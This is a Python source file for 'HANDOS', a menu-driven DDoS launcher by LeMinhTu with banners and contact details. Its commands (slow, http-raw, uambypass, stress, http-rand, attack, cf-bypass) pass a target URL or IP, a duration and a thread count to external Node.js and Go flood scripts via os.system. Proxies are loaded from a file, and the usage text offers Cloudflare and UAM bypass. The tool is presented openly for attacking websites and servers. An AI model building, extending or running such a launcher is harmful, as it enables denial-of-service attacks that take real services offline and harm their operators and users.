from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.MAGENTA + """
     db   db  .d8b.  d8b   db d8888b.  .d88b.  .d8888.
    88   88 d8' `8b 888o  88 88  `8D .8P  Y8. 88'  YP
    88ooo88 88ooo88 88V8o 88 88   88 88    88 `8bo.
    88~~~88 88~~~88 88 V8o88 88   88 88    88   `Y8b.
    88   88 88   88 88  V888 88  .8D `8b  d8' db   8D
     YP   YP YP   YP VP   V8P Y8888D'  `Y88P'  `8888Y'  
     ▒ ░▒░ ░  ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░
     ░  ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ░
     ░  ░  ░      ░  ░            ░ ░  ░  ░    ░   by LeMinhTu
                                           """)
    time.sleep(1.8)
    clear()

def si():
    print("Zalo/Call: 0782554949")
    print("Information: https://leminhtus.info")

def menu():
    sys.stdout.write(f"HANDOS Update 1.0.9")
    clear()
    print('HANDOS By LeMinhTu [LeMinhTu.info] ')
    print("https://LeMinhTu.info")
    print(Fore.LIGHTCYAN_EX + """
            ╚═════════════════════╦═════════════════════════════════════════╦══════════════════════╝
                ╔═════════════════╩══════════════[HANDOS-DDoS]══════════════╩══════════════════╗
               ╔╝------------------------------------------------------------------------------╚╗
               ║   **      **     **     ****     **       *******     *******    ********      ║
               ║ / /**     /**    ****   /**/**   /**    / /**////**   **/////**  **//////      ║
               ║ Ⅰ /**     /**   **//**  /**//**  /**    Ⅰ  /**    /** **     //**/**            ║
               ║ Ⅰ  /**********  **  //** /** //** /**   Ⅰ  /**    /**/**      /**/*********     ║
               ║ Ⅰ  /**//////** **********/**  //**/**   Ⅰ  /**    /**/**      /**////////**     ║
               ║ Ⅰ  /**     /**/**     /**/**    //***   Ⅰ  /*******   //*******   ******** "    ║
               ║ / /      // //      // //      ///      / ///////     ///////   ////////       ║
               ║------------ Link faceBook : https://www.facebook.com/3T.GM.0405 -----------    ║
               ╚════════════════════════╦═══════════════════════════╦═══════════════════════════╝
                     ╔══════════════════╩═══════════════════════════╩═══════════════════╗
                     ║--------------  Nghiêm cấm tấn công web chính phủ  ---------------║ 
                     ╚═════════════╦══════════════════════════════════════╦═════════════╝
                         ╔═════════╩═════════╗                  ╔═════════╩═════════╗
                         ║  Nguyễn Ngọc Hân  ╠══════════════════╣  Nguyễn Ngọc Hân  ║
                         ║    0782554949     ║ -   -   -   -  - ║    0782554949     ║
                         ║     mikn_tus      ╠══════════════════╣     mikn_tus      ║
                         ╚═══════════════════╝                  ╚═══════════════════╝
""")

def main():
    menu()
    while(True):
        cnc = input(Fore.LIGHTCYAN_EX+"╔═══"+ Fore.LIGHTCYAN_EX+"[""root"+ Fore.LIGHTCYAN_EX+"@"+ Fore.RED+"HANDOS"+ Fore.LIGHTCYAN_EX+"]"+ Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.RED)
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://LeMinhTu.com 60')
                
        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.LIGHTCYAN_EX +'Usage: http-raw <url> <time>')
                print(Fore.LIGHTCYAN_EX +'Example: http-raw http://LeMinhTu.info/ 60')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print(Fore.RED +'Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.YELLOW +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.YELLOW +'MODE: [1] TCP')
                print(Fore.YELLOW +'      [2] UDP')
                print(Fore.YELLOW +'      [3] HTTP')
                print(Fore.YELLOW +'Example: stress 9.9.9.9 80/443 3 1250 60 5')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-rand <url> <time>')
                print(Fore.RED +'Example: http-rand http://LeMinhTu.info/ 60')

        elif "attack" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run attack.go -site {url} -data {method}')
            except IndexError:
                print(Fore.RED +'Usage: attack <url> METHODS<GET/POST>')
                print(Fore.RED +'Example: attack http://LeMinhTu.info/ GET')
        
        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "info" in cnc:
            print(f'''
[https://LeMinhTu.info]
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
main()
